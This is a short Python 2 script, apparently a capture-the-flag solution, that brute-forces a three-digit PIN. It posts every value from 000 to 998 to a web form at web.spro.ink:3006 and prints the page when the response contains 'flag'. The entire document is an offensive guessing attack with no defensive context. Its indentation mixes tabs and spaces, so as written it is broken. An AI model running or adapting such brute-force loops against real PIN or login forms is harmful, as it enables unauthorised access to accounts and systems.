#!/usr/bin/python

import requests

for i in range(0, 999):

    html = requests.post("http://web.spro.ink:3006/", data={"num":"%03d" % i}).text
	
	if "flag" in html:
		print "The PIN is %03d" % i
		print html
	else:
		pass
		
